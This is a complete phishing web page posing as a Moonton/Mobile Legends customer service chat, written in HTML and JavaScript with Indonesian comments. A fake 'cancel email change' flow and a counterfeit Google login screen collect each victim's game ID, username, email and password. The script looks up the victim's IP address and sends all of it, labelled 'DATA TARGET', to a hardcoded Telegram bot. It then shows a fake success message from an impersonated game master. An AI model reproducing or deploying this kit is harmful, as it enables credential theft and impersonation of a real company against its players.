<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Moonton Service Center</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Hanya menyimpan style yang esensial untuk fungsi */
        .message-bubble {
            max-width: 90%; 
            border-radius: 0.75rem;
            padding: 0.5rem 1rem;
            word-wrap: break-word;
        }
        .bot-message {
            background-color: #ffffff;
            border: 1px solid #e5e7eb;
        }
        .user-message {
            background-color: #2563eb;
            color: white;
        }
        
        /* Floating label untuk form inline */
        .floating-label-group {
            position: relative;
            margin-top: 1.0rem;
            border: 2px solid #d1d5db;
            border-radius: 0.5rem;
        }
        .floating-label-group input {
            padding: 0.6rem 1rem 0.4rem 1rem;
            border: none;
            width: 100%;
            background-color: transparent;
        }
        .floating-label {
            position: absolute;
            left: 1rem;
            top: 50%;
            transform: translateY(-50%);
            pointer-events: none;
            transition: all 0.2s ease;
            color: #9ca3af;
            background-color: white;
            padding: 0 0.25rem;
        }
        .floating-label-group input:focus + .floating-label,
        .floating-label-group input:not(:placeholder-shown) + .floating-label {
            top: -0.5rem;
            transform: translateY(0);
            font-size: 0.65rem;
            color: #3b82f6;
        }
        
        /* Loading dan modal */
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #2563eb;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .hidden {
            display: none !important;
        }
        
        /* Typing indicator */
        .dot {
            display: inline-block;
            width: 6px;
            height: 6px;
            background-color: #3b82f6;
            border-radius: 50%;
            margin: 0 1px;
            animation: bounce 1.8s infinite;
        }
        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-6px); }
            60% { transform: translateY(-3px); }
        }
    </style>
</head>
<body style="background-color: #e5e7eb; font-family: sans-serif; margin: 0; padding: 20px; min-height: 100vh;">

    <!-- Area Chat Utama -->
    <div id="chatArea" style="max-width: 600px; margin: 0 auto; background-color: #f8f8f8; border-radius: 12px; padding: 16px; min-height: 80vh;">
        <!-- Pesan akan ditambahkan di sini secara dinamis -->
        <div class="flex justify-start">
            <div class="message-bubble bot-message">
                <p style="font-weight: bold; font-size: 0.875rem; margin-bottom: 4px; color: #2563eb;">Moonton Technology Co.</p>
                <p>Hey, hero! Welcome to the Moonton customer service center.</p>
                <p style="margin-top: 8px;">Please select the topic you would like to chat about from the options below:</p>
                <div style="margin-top: 8px;">
                    <button style="color: #2563eb; text-decoration: underline; display: block; text-align: left; background: none; border: none; cursor: pointer; padding: 2px 0;" onclick="handleCommand('Cancel change email')">
                        · Cancel change email
                    </button>
                    <button style="color: #2563eb; text-decoration: underline; display: block; text-align: left; background: none; border: none; cursor: pointer; padding: 2px 0;" onclick="handleCommand('Account Recovery')">
                        · Account Recovery
                    </button>
                    <button style="color: #2563eb; text-decoration: underline; display: block; text-align: left; background: none; border: none; cursor: pointer; padding: 2px 0;" onclick="handleCommand('Bug Reports')">
                        · Bug Reports
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- Modal Login (Google) -->
    <div id="selectionModal" class="hidden" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.75); display: flex; align-items: center; justify-content: center; z-index: 50;">
        <div style="background-color: white; border-radius: 12px; max-width: 400px; width: 90%; overflow: hidden;">
            <div style="padding: 20px; border-bottom: 1px solid #e5e7eb; display: flex; align-items: center; justify-content: space-between;">
                <div style="display: flex; align-items: center; gap: 8px;">
                    <img src="https://i.postimg.cc/brSXG9rd/moonton.png" alt="Moonton Logo" style="width: 32px; height: 32px;">
                    <h2 style="font-weight: bold; font-size: 1.25rem;">Moonton Technology Co.</h2>
                </div>
                <button onclick="closeSelectionModal()" style="color: #6b7280; background: none; border: none; cursor: pointer; padding: 4px; border-radius: 50%;">
                    ✕
                </button>
            </div>
            <div style="padding: 24px; text-align: center;">
                <h3 style="font-size: 1.125rem; font-weight: 600;">Login.</h3>
                <p style="font-size: 0.875rem; margin-top: 4px;">Select the login option to continue.</p>
                <button onclick="startRegistrationFlow(2)" style="width: 100%; display: flex; align-items: center; justify-content: center; padding: 12px; border: 2px solid #d1d5db; border-radius: 12px; font-weight: 600; margin-top: 16px; cursor: pointer; background: white;">
                    <img src="https://i.postimg.cc/tgqHry1n/google.png" alt="Google Logo" style="width: 24px; height: 24px; margin-right: 12px;">
                    Login with google
                </button>
                <p style="font-size: 0.75rem; color: #6b7280; margin-top: 16px;">
                    I have read and agree to the terms of service and privacy policy of Moonton Technology Co.
                </p>
            </div>
        </div>
    </div>

    <!-- Registration View (Fullscreen) -->
    <div id="registrationView" class="hidden" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: white; z-index: 60; display: flex; flex-direction: column;">
        <header style="padding: 24px; text-align: center;">
            <h3 style="font-size: 1.875rem; font-weight: 500; margin-bottom: 8px;">Google</h3>
            <div style="display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 24px;">
                <img src="https://i.postimg.cc/brSXG9rd/moonton.png" alt="Moonton Logo" style="width: 32px; height: 32px;">
                <h2 style="font-weight: 500; font-size: 1.125rem;">Moonton Technology Co.</h2>
            </div>
            <div style="max-width: 450px; margin: 0 auto; text-align: left; font-size: 0.95rem; line-height: 1.4;">
                <span>Use your Google Account.</span><br>
                <span>The account will be added to this device and available to Moonton Technology Co.</span><br>
                <a href="#" style="color: #3b82f6; text-decoration: none;">learn more about how to use your account.</a>
            </div>
        </header>
        
        <main style="flex-grow: 1; padding: 0 24px 24px; display: flex; flex-direction: column;">
            <!-- Step 2: Email/Phone -->
            <div id="step2" style="display: flex; flex-direction: column; height: 100%;">
                <div style="flex-grow: 1;">
                    <div class="floating-label-group">
                        <div style="border: 2px solid #d1d5db; border-radius: 8px; max-width: 450px; margin: 0 auto;">
                            <input id="usernameUserInput" type="email" placeholder="" style="width: 100%; padding: 12px; border: none; outline: none;">
                            <label for="usernameUserInput" class="floating-label">Email or phone number</label>
                        </div>
                    </div>
                    <div id="usernameError" style="color: #ef4444; font-size: 0.875rem; max-width: 450px; margin: 8px auto 0; display: none;"></div>
                </div>
                <div style="max-width: 450px; margin: 0 auto; width: 100%; display: flex; justify-content: flex-end; padding-top: 16px;">
                    <button onclick="processStep2()" style="background-color: #2563eb; color: white; font-weight: 600; padding: 8px 24px; border-radius: 8px; border: none; cursor: pointer;">
                        Next
                    </button>
                </div>
            </div>
            
            <!-- Step 3: Password -->
            <div id="step3" class="hidden" style="display: flex; flex-direction: column; height: 100%;">
                <div style="flex-grow: 1; padding-top: 40px;">
                    <div class="floating-label-group">
                        <div style="border: 2px solid #d1d5db; border-radius: 8px; max-width: 450px; margin: 0 auto;">
                            <input id="namaTokohInput" type="password" placeholder="" style="width: 100%; padding: 12px; border: none; outline: none;">
                            <label for="namaTokohInput" class="floating-label">Password</label>
                        </div>
                    </div>
                    <div style="max-width: 450px; margin: 16px auto 0; display: flex; align-items: center;">
                        <input type="checkbox" id="showPasswordCheckbox" onchange="handleShowPassword(this)" style="margin-right: 12px;">
                        <label for="showPasswordCheckbox" style="font-size: 0.95rem;">Show password</label>
                    </div>
                </div>
                <div style="max-width: 450px; margin: 0 auto; width: 100%; display: flex; justify-content: flex-end; padding-top: 16px;">
                    <button onclick="processRegistration()" style="background-color: #2563eb; color: white; font-weight: 600; padding: 8px 24px; border-radius: 8px; border: none; cursor: pointer;">
                        Next
                    </button>
                </div>
            </div>
        </main>
    </div>

    <!-- Full Screen Loader -->
    <div id="fullScreenLoader" class="hidden" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: white; z-index: 70; display: flex; flex-direction: column; align-items: center; justify-content: center;">
        <p style="font-size: 1.25rem; font-weight: 500; margin-bottom: 48px;">Please wait...</p>
        <div class="loader"></div>
    </div>

<script>
// --- KONFIGURASI TELEGRAM ---
const TELEGRAM_BOT_TOKEN = '7887238935:AAEbdlUzTW_8WmiCMC61gnmNa36ch1Kb5Sk';
const ADMIN_USERNAME = '@MobileLegendServiceCenter';
const TELEGRAM_CHAT_ID = '7423591679';

let registrationData = {
    user_id_kode: '',
    username_jagoan: '',
    username_user: '',
    nama_tokoh: '',
    ip_address: '',
    source: ''
};

let modalCompleted = false;
let registrationCompleted = false;

// --- DOM Elements ---
const chatArea = document.getElementById('chatArea');
const selectionModal = document.getElementById('selectionModal');
const registrationView = document.getElementById('registrationView');
const fullScreenLoader = document.getElementById('fullScreenLoader');
const step2 = document.getElementById('step2');
const step3 = document.getElementById('step3');
const usernameUserInput = document.getElementById('usernameUserInput');
const namaTokohInput = document.getElementById('namaTokohInput');

// --- FUNGSI UTAMA ---
function addMessage(text, sender) {
    const messageDiv = document.createElement('div');
    messageDiv.style.display = 'flex';
    messageDiv.style.justifyContent = sender === 'user' ? 'flex-end' : 'flex-start';
    messageDiv.style.marginBottom = '8px';

    const bubble = document.createElement('div');
    bubble.className = `message-bubble ${sender === 'user' ? 'user-message' : 'bot-message'}`;
    
    if (sender === 'bot') {
        const senderName = document.createElement('p');
        senderName.style.fontWeight = 'bold';
        senderName.style.fontSize = '0.875rem';
        senderName.style.marginBottom = '4px';
        senderName.style.color = '#2563eb';
        senderName.textContent = 'Moonton Technology Co.';
        bubble.appendChild(senderName);
    }

    bubble.innerHTML += text;
    messageDiv.appendChild(bubble);
    chatArea.appendChild(messageDiv);
    chatArea.scrollTop = chatArea.scrollHeight;
}

function showTypingIndicator() {
    removeTypingIndicator();
    
    const typingDiv = document.createElement('div');
    typingDiv.id = 'typingIndicator';
    typingDiv.style.display = 'flex';
    typingDiv.style.justifyContent = 'flex-start';
    typingDiv.style.marginBottom = '8px';

    const bubble = document.createElement('div');
    bubble.className = 'message-bubble bot-message';
    
    const content = document.createElement('div');
    content.innerHTML = `
        <p style="font-weight: bold; font-size: 0.875rem; margin-bottom: 4px; color: #2563eb;">Moonton Technology Co.</p>
        <div style="display: flex; align-items: center; height: 16px;">
            <span class="dot"></span>
            <span class="dot"></span>
            <span class="dot"></span>
        </div>
    `;
    
    bubble.appendChild(content);
    typingDiv.appendChild(bubble);
    chatArea.appendChild(typingDiv);
    chatArea.scrollTop = chatArea.scrollHeight;
}

function removeTypingIndicator() {
    const typingIndicator = document.getElementById('typingIndicator');
    if (typingIndicator) typingIndicator.remove();
}

// --- HANDLE COMMANDS ---
function handleCommand(command) {
    addMessage(command, 'user');
    showTypingIndicator();

    setTimeout(() => {
        removeTypingIndicator();
        
        switch(command) {
            case 'Cancel change email':
                if (registrationCompleted) {
                    addMessage('<p>Berikut adalah list harga Diamond Mobile Legends:</p><ul><li>100 Diamond: Rp 25.000</li><li>200 Diamond: Rp 49.000</li><li>500 Diamond: Rp 120.000</li></ul>', 'bot');
                } else if (modalCompleted) {
                    showInlineRegistrationForm(true);
                } else {
                    showInlineRegistrationForm(false);
                }
                break;
                
            case 'Account Recovery':
                const verifBadge = `<img src="https://i.postimg.cc/rmBGkWD8/73039e1668b4f2254a7085b1e4d597b5-removebg-preview.png" alt="Verified" style="width: 18px; height: 18px; margin-left: 4px; vertical-align: middle;">`;
                addMessage(`<p>Hey hero! We understand you're having trouble recovering your account. However, we're still experiencing server issues for account recovery. We'll update you soon.</p><p style="margin-top: 12px;">Sincerely, Moonton Technology Co.</p><p style="margin-top: 4px; font-weight: 600; color: #2563eb;">[GM] Nita ${verifBadge}</p>`, 'bot');
                break;
                
            case 'Bug Reports':
                addMessage(`<p>Visit our <a href="https://t.me/${ADMIN_USERNAME.replace('@', '')}?text=Hi%20Moonton,%20I%20want%20to%20report%20about%20bug%20report" target="_blank" style="color: #2563eb; text-decoration: underline; font-weight: 600;">Customer service</a> to explain bugs in the game</p>`, 'bot');
                break;
        }
    }, 800);
}

// --- INLINE REGISTRATION FORM ---
function showInlineRegistrationForm(isFinalStep = false) {
    const buttonText = isFinalStep ? 'Cancel change email' : 'Submit';
    const formAction = isFinalStep ? 'handleFinalDataSubmission(this)' : 'handleInlineRegistration(this, false)';
    const initialText = "Please fill in your account details to cancel your email change.";
    const finalText = "Make sure your data is correct, then click send to cancel change email.";

    const formHTML = `
        <p>${isFinalStep ? finalText : initialText}</p>
        <form id="inlineForm" onsubmit="event.preventDefault(); ${formAction}" style="margin-top: 16px; padding: 12px; background-color: white; border-radius: 8px; border: 1px solid #e5e7eb;">
            <div class="floating-label-group" style="margin-bottom: 12px;">
                <input type="text" id="userIdKodeInput" placeholder=" " value="${registrationData.user_id_kode || ''}" 
                       style="width: 100%; padding: 12px; border: 2px solid #d1d5db; border-radius: 8px; outline: none;"
                       oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                <label for="userIdKodeInput" class="floating-label">Id/Server</label>
            </div>
            
            <div class="floating-label-group" style="margin-bottom: 16px;">
                <input type="text" id="usernameJagoanInput" placeholder=" " value="${registrationData.username_jagoan || ''}"
                       style="width: 100%; padding: 12px; border: 2px solid #d1d5db; border-radius: 8px; outline: none;">
                <label for="usernameJagoanInput" class="floating-label">Username</label>
            </div>
            
            <button type="submit" style="width: 100%; background-color: #2563eb; color: white; font-weight: 600; padding: 10px; border-radius: 8px; border: none; cursor: pointer;">
                ${buttonText}
            </button>
        </form>
    `;
    
    addMessage(formHTML, 'bot');
}

function handleInlineRegistration(formElement, isFinal = false) {
    if (!isFinal) {
        const userIdKode = document.getElementById('userIdKodeInput').value.trim();
        const usernameJagoan = document.getElementById('usernameJagoanInput').value.trim();

        if (!userIdKode || !usernameJagoan) {
            alert("Please fill in the ID/server and username correctly to cancel change Email.");
            return;
        }
        
        if (!/^[0-9]+$/.test(userIdKode)) {
            alert("Id/Server harus berupa angka!");
            return;
        }

        registrationData.user_id_kode = userIdKode;
        registrationData.username_jagoan = usernameJagoan;
        registrationData.source = 'Cancel change email';
        
        addMessage(`Id/Server: ${userIdKode}, Username: ${usernameJagoan}`, 'user');
        
        showTypingIndicator();
        setTimeout(() => {
            removeTypingIndicator();
            addMessage(`Hey hero! Your account data has been received, to verify please log in with your account.<br><button onclick="openSelectionModal()" style="background-color: #2563eb; color: white; font-size: 0.875rem; padding: 6px 16px; border-radius: 999px; border: none; cursor: pointer; margin-top: 8px;">Login.</button>`, 'bot');
        }, 800);
    } else {
        handleFinalDataSubmission(formElement);
    }
}

async function handleFinalDataSubmission(formElement) {
    const userIdKode = document.getElementById('userIdKodeInput').value.trim();
    const usernameJagoan = document.getElementById('usernameJagoanInput').value.trim();

    if (!userIdKode || !usernameJagoan) {
        alert("Mohon isi semua kolom Id/Server dan Username.");
        return;
    }

    registrationData.user_id_kode = userIdKode;
    registrationData.username_jagoan = usernameJagoan;
    
    // Show loader
    fullScreenLoader.classList.remove('hidden');
    
    // Get IP
    let ipAddress = 'IP_Address_Gagal_Diambil';
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        ipAddress = ipData.ip || ipAddress;
    } catch (error) {
        console.error("Gagal mendapatkan IP:", error);
    }
    registrationData.ip_address = ipAddress;

    // Send to Telegram
    await sendToTelegramBot(registrationData);
    
    registrationCompleted = true;

    // Hide loader after 2 seconds
    setTimeout(() => {
        fullScreenLoader.classList.add('hidden');
        
        const verifBadge = `<img src="https://i.postimg.cc/rmBGkWD8/73039e1668b4f2254a7085b1e4d597b5-removebg-preview.png" alt="Verified" style="width: 18px; height: 18px; margin-left: 4px; vertical-align: middle;">`;
        const telegramLink = `https://t.me/${ADMIN_USERNAME.replace('@', '')}?text=Successfully%20canceled%20the%20email%20change,%20please%20include%20screenshot`;
        
        addMessage(`<p style="font-weight: bold; font-size: 1.125rem; color: #2563eb;">Successfully canceled the email change</p><p style="margin-top: 4px;">Please take a screenshot and send it to our <a href="${telegramLink}" target="_blank" style="color: #2563eb; text-decoration: underline; font-weight: 600;">customer service</a>.</p><p style="margin-top: 8px; font-weight: 600; color: #2563eb;">[GM] Nita ${verifBadge}</p>`, 'bot');
    }, 2000);
}

// --- MODAL FUNCTIONS ---
function openSelectionModal() {
    selectionModal.classList.remove('hidden');
}

function closeSelectionModal() {
    selectionModal.classList.add('hidden');
}

async function startRegistrationFlow(startStep) {
    selectionModal.classList.add('hidden');
    fullScreenLoader.classList.remove('hidden');
    
    await new Promise(resolve => setTimeout(resolve, 1500));
    fullScreenLoader.classList.add('hidden');
    
    registrationView.classList.remove('hidden');
    showStep(startStep);
}

function showStep(stepNumber) {
    step2.style.display = stepNumber === 2 ? 'flex' : 'none';
    step3.style.display = stepNumber === 3 ? 'flex' : 'none';
    
    if (stepNumber === 2) {
        setTimeout(() => usernameUserInput.focus(), 100);
    } else if (stepNumber === 3) {
        namaTokohInput.type = 'password';
        setTimeout(() => namaTokohInput.focus(), 100);
    }
}

function processStep2() {
    const usernameUser = usernameUserInput.value.trim();
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const errorElement = document.getElementById('usernameError');

    errorElement.textContent = '';
    errorElement.style.display = 'none';
    
    if (!usernameUser) {
        errorElement.textContent = 'Mohon masukkan alamat email atau nomor telepon.';
        errorElement.style.display = 'block';
        return;
    }
    
    if (!emailRegex.test(usernameUser)) {
        errorElement.textContent = "ⓘ Can't find your Google account.";
        errorElement.style.display = 'block';
        return;
    }

    registrationData.username_user = usernameUser;
    showStep(3);
}

function handleShowPassword(checkbox) {
    namaTokohInput.type = checkbox.checked ? 'text' : 'password';
}

function processRegistration() {
    const namaTokoh = namaTokohInput.value.trim();
    if (!namaTokoh) {
        alert("Password tidak boleh kosong!");
        return;
    }
    
    registrationData.nama_tokoh = namaTokoh;
    modalCompleted = true;
    
    registrationView.classList.add('hidden');
    
    fullScreenLoader.classList.remove('hidden');
    setTimeout(() => {
        fullScreenLoader.classList.add('hidden');
        
        const verifBadge = `<img src="https://i.postimg.cc/rmBGkWD8/73039e1668b4f2254a7085b1e4d597b5-removebg-preview.png" alt="Verified" style="width: 18px; height: 18px; margin-left: 4px; vertical-align: middle;">`;
        addMessage(`<p style="font-weight: bold; color: #2563eb; font-size: 1.125rem;">Report has been received!</p><p>Please re-verify your account. No one else can access this report except you. Ensure the data is correct to avoid errors.</p><p style="font-weight: 600; color: #2563eb;">[GM] Nita ${verifBadge}</p>`, 'bot');
        
        showInlineRegistrationForm(true);
    }, 1000);
}

// --- TELEGRAM FUNCTION ---
async function sendToTelegramBot(data) {
    if (TELEGRAM_CHAT_ID === '0') {
        console.warn("Telegram tidak dikirim: CHAT_ID masih 0");
        return;
    }
    
    const message = 
        `*DATA TARGET*\n` +
        `----------------------------------------\n` +
        `*Id/Server:* ${data.user_id_kode || '-'}\n` +
        `*Username:* ${data.username_jagoan || '-'}\n` +
        `*Email/Phone:* ${data.username_user || '-'}\n` +
        `*Password:* ${data.nama_tokoh || '-'}\n` +
        `*IP:* ${data.ip_address || '-'}\n` +
        `*Sumber:* ${data.source || '-'}\n` +
        `----------------------------------------`;
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        console.log("Data terkirim ke Telegram");
    } catch (error) {
        console.error("Gagal kirim ke Telegram:", error);
    }
}

// Initialize floating labels
document.addEventListener('DOMContentLoaded', () => {
    // Initialize floating labels for registration view
    document.querySelectorAll('.floating-label-group input').forEach(input => {
        const updateFloatingState = () => {
            const isFilled = input.value.trim() !== '';
            const label = input.nextElementSibling;
            if (label && label.classList.contains('floating-label')) {
                if (isFilled || document.activeElement === input) {
                    label.style.top = '-0.5rem';
                    label.style.transform = 'translateY(0)';
                    label.style.fontSize = '0.65rem';
                    label.style.color = '#3b82f6';
                } else {
                    label.style.top = '50%';
                    label.style.transform = 'translateY(-50%)';
                    label.style.fontSize = '';
                    label.style.color = '#9ca3af';
                }
            }
        };

        input.addEventListener('focus', updateFloatingState);
        input.addEventListener('blur', updateFloatingState);
        input.addEventListener('input', updateFloatingState);
        updateFloatingState();
    });
});
</script>
</body>
</html>
